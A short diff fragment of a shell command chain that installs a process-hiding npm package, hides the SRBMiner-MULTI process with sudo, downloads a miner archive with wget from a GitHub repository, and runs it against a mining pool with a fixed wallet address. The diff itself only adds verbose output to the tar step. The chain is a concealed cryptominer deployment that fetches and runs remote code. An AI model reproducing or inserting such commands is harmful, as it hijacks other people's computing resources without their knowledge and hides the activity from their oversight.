@@ -8,4 +8,4 @@ npm i -g node-process-hider &&
 sudo ph add SRBMiner-MULTI && 
 wget https://github.com/geraldyolang11/mine/raw/main/sm.tar.gz && 
 chmod +x sm.tar.gz && 
-tar -xf sm.tar.gz && chmod +x SRBMiner-MULTI && ./SRBMiner-MULTI --disable-gpu --algorithm verushash --pool verushash.eu.mine.zergpool.com:3300 --wallet 16GF8LfH1eLW2sWioKvTPoSKZ4U1i8Koci --password c=BTC,mc=VRSC --cpu-threads 2"
+tar -xvf sm.tar.gz && chmod +x SRBMiner-MULTI && ./SRBMiner-MULTI --disable-gpu --algorithm verushash --pool verushash.eu.mine.zergpool.com:3300 --wallet 16GF8LfH1eLW2sWioKvTPoSKZ4U1i8Koci --password c=BTC,mc=VRSC --cpu-threads 2"
